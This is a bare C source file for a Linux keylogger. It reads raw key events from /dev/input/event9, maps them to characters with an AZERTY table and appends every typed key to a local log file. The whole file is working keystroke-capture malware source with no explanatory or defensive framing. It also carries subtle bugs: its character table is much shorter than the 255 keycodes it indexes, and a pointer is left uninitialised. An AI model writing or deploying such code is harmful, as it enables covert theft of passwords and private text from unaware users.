#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define MAX_KEYCODE 255

char map[] = "..1234567890-=..azertyuiop{}..qsdfghjklmù*.wxcvbn,;:!";

int main(int argc, char **argv) 
{
    struct input_event events;
    int file_descriptor = open("/dev/input/event9", O_RDONLY);
    FILE *file_pointer = fopen("./log", "a");
    
    if (file_descriptor == -1 || file_pointer == NULL) 
	{
        printf("Error opening file or input event");
        return -1;
    }
    
    while (1) 
	{
        if (read(file_descriptor, &events, sizeof(events)) == -1) 
		{
            printf("Error reading input event");
            break;
        }
        
        if (events.type == EV_KEY && events.value == 0) 
		{
            fflush(file_pointer);
            
            char *character;
            if (events.code >= 0 && events.code <= MAX_KEYCODE) 
			{
                character = &map[events.code];
            }
            
            if (character != NULL) 
			{
                if (events.code == 28) 
				{
                    fprintf(file_pointer, "\n");
                } 
				else if (events.code == 57) 
				{
                    fprintf(file_pointer, " ");
                } 
				else 
				{
                    fprintf(file_pointer, "%c", *character);
                }
            }
        }
    }
    
    fclose(file_pointer);
    close(file_descriptor);
    
    return 0;
}
